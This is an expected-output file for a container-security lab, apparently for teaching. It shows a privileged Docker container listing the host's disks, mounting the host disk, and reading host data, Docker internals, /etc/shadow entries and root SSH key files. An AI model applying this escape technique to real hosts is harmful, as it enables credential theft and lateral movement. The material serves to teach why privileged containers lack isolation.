# Expected Output: Lab 03 - Privileged Container Escape

## On Docker Desktop (macOS/Windows)

The exploit escapes into the Docker Desktop LinuxKit VM. The data partition contains Docker's internal state (all container layers, volumes, etc.).

```
=== Lab 03: Privileged Container Escape ===

[*] Launching a privileged container...
[*] This simulates an agent container started with --privileged
    to 'simplify permissions' or 'access GPU/devices'.

[Host]   hostname=Cristians-MacBook-Pro.local  kernel=25.3.0

[*] Inside the privileged container:
    hostname=d3d908449c87
    kernel=6.10.14-linuxkit

[*] Step 1: Block devices visible from inside the container:
    Disk /dev/vda: 1024 GB, 1099511627776 bytes, 2147483648 sectors
    Disk /dev/vdb: 550 MB, 577130496 bytes, 1127208 sectors
    Disk /dev/vdb doesn't contain a valid partition table

    These are the HOST disks, not the container's. The container
    should not be able to see physical block devices.

[*] Step 2: Mounting /dev/vda1...
    mount: SUCCESS — host disk now accessible at /mnt/host

[*] Step 3: Reading data from the mounted host disk:

    [host disk] Docker data directory:
    buildkit
    containers
    engine-id
    ...

    [host disk] machine-id: 1a92e0029a8c4bacb6ec6507dbb028cd

    [host disk] Root directory listing:
    cni
    containerd
    docker
    ...

[*] Summary: the privileged container:
    1. Can see all host block devices (fdisk -l)
    2. Can mount the host disk
    3. Can read sensitive files (shadow, SSH keys, Docker data)
    4. Has full read/write access — can install backdoors, exfiltrate data

[!] --privileged or --cap-add=SYS_ADMIN = no isolation.
```

## On a native Linux host

On a real Linux host, the output is more dramatic — you'll see actual host files:

```
[*] Step 3: Reading data from the mounted host disk:

    [host disk] /etc/hostname: my-linux-host
    [container] hostname:      a1b2c3d4e5f6

    [host disk] /etc/os-release:
    NAME="Ubuntu"
    VERSION="22.04.3 LTS (Jammy Jellyfish)"
    ID=ubuntu

    [host disk] /etc/shadow (first 3 lines):
    root:$6$...:19000:0:99999:7:::
    daemon:*:19000:0:99999:7:::
    bin:*:19000:0:99999:7:::

    [host disk] SSH keys in /root/.ssh/:
    -rw-------  1 root root 2602 Jan 10 09:00 id_rsa
    -rw-r--r--  1 root root  571 Jan 10 09:00 id_rsa.pub
```

## Key Observations

1. **Host kernel matches container kernel**: Both show `6.10.14-linuxkit` — proving the container shares the host's kernel (unlike a micro-VM which has its own).

2. **Block devices exposed**: The container sees physical disks (`/dev/vda`, `/dev/vdb`) that belong to the host, not the container.

3. **Docker internals accessible**: On Docker Desktop, the mounted disk contains the Docker data directory — `containers`, `overlay2`, `volumes` — meaning the privileged container can read **every other container's filesystem**.

4. **On native Linux**: `/etc/shadow` (password hashes) and SSH private keys are directly readable, enabling credential theft and lateral movement.
